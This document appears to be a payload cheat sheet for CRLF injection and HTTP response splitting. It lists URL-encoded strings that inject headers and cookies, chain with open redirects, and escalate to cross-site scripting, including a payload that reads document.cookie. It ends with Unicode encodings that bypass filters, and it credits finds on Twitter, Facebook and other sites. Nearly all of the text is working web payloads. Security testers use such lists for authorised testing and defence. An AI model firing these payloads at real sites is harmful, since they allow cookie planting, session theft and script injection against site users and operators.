# CRLF Injection || HTTP Response Splitting

## Basic
```
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
/%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

```

## Header-based test, site root

```
%0d%0aheader:header
```
```
%0aheader:header
```
```
%0dheader:header
```
```
%23%0dheader:header
```
```
%3f%0dheader:header
```

```
/%250aheader:header
```

```
/%25250aheader:header
```

```
/%%0a0aheader:header
```

```
/%3f%0dheader:header
```

```
/%23%0dheader:header
```

```
/%25%30aheader:header
```

```
/%25%30%61header:header
```

```
/%u000aheader:header
```

## CRLF chained with Open Redirect server misconfiguration

_Note:_ This sometimes works. (Discovered in some Yandex sites, was not exploitable from the root.)

```
//www.google.com/%2f%2e%2e%0d%0aheader:header
/www.google.com/%2e%2e%2f%0d%0aheader:header
/google.com/%2F..%0d%0aheader:header
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2 
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
/google.com/%2F..%0D%0AHeader-Test:test2
/%0d%0aLocation:%20http://example.com
```

## Twitter specific CRLF by [@filedescriptor](http://blog.innerht.ml/twitter-crlf-injection/)

```
%E5%98%8A%E5%98%8Dheader:header
```

## CRLF Injection to XSS

```
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```

## Response splitting on 302 Redirect, before Location header (Discovered in DoD)

```
%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E
```

## Response splitting on 301 code, chained with Open Redirect to corrupt location header and to break 301** by [@black2fan](https://twitter.com/black2fan) (Facebook bug)

_Note:_ `xxx:1` was used for breaking open redirect destination (Location header). Great example how of to escalate CRLF to XSS on a such, it would seem, unexploitable 301 status code.

```
%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr
```

## Filter Bypass
   - %E5%98%8A = %0A = \u560a
   - %E5%98%8D = %0D = \u560d
   - %E5%98%BE = %3E = \u563e (>)
   - %E5%98%BC = %3C = \u563c (<)
   - Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
   - 0x0D0x0A = %0D%0A
